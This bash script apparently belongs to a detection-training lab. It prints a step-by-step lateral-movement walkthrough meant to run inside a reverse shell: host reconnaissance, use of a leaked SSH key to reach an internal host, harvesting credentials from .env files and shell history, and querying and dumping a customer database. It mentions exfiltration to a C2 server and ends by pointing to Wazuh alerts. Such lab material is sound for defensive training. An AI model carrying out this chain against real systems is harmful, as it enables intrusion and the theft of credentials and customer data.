#!/bin/bash
# ====================================================================
# Demo Attack Script - Phase 3: Lateral Movement
# Run di REVERSE SHELL session (sebagai www-data)
# ====================================================================

cat <<'BANNER'
╔══════════════════════════════════════════════════════════════════╗
║  PHASE 3: LATERAL MOVEMENT                                       ║
║  Run COMMAND-COMMAND INI DI REVERSE SHELL SESSION               ║
╚══════════════════════════════════════════════════════════════════╝

Step 1: Discovery di compromised host
─────────────────────────────────────
$ id
$ hostname
$ ip addr
$ cat /etc/hosts
$ ss -tulpn

Step 2: Cari leaked credential
─────────────────────────────────────
$ ls -la /var/www/html/
$ cat /var/www/html/.maintenance_key

# Tip: ada hint di HTML comment di index.php:
#   "Maintenance access: webapp@internal-app via SSH key in /var/www/html/.maintenance_key"

Step 3: SSH lateral ke internal-app
─────────────────────────────────────
$ chmod 600 /var/www/html/.maintenance_key
$ ssh -o StrictHostKeyChecking=no -i /var/www/html/.maintenance_key webapp@172.20.0.20

# Sekarang lo udah masuk ke internal-app sebagai user 'webapp'!

Step 4: Cari credential database di internal-app
─────────────────────────────────────
$ id
$ ls -la ~/app/
$ cat ~/app/.env
$ cat ~/app/config/database.yml
$ history
$ cat ~/.bash_history

# Notice DB credentials:
# - DB_HOST=db-server
# - DB_USER=appuser
# - DB_PASS=AppDB_P@ssw0rd_2024

Step 5: Connect ke database
─────────────────────────────────────
$ mysql -h db-server -u appuser -pAppDB_P@ssw0rd_2024 customers -e "SHOW TABLES;"
$ mysql -h db-server -u appuser -pAppDB_P@ssw0rd_2024 customers -e "SELECT * FROM customers LIMIT 5;"
$ mysql -h db-server -u appuser -pAppDB_P@ssw0rd_2024 customers -e "SELECT * FROM internal_flags;"

Step 6: Exfiltrate data (CROWN JEWEL)
─────────────────────────────────────
$ mysqldump -h db-server -u appuser -pAppDB_P@ssw0rd_2024 customers > /tmp/loot.sql
$ cat /tmp/loot.sql | head -50
$ # Exfil via curl ke C2 (atau base64 encode)

CONGRATULATIONS!
═══════════════════════════════════════════════════════════════════
Full kill chain achieved:
  [✓] Reconnaissance
  [✓] Initial Access (RCE via command injection)
  [✓] Lateral Movement (SSH dengan leaked key)
  [✓] Credential Access (config files & history)
  [✓] Collection (database dump)

Sekarang cek di Wazuh Dashboard - berapa alert yang ke-trigger?
═══════════════════════════════════════════════════════════════════
BANNER
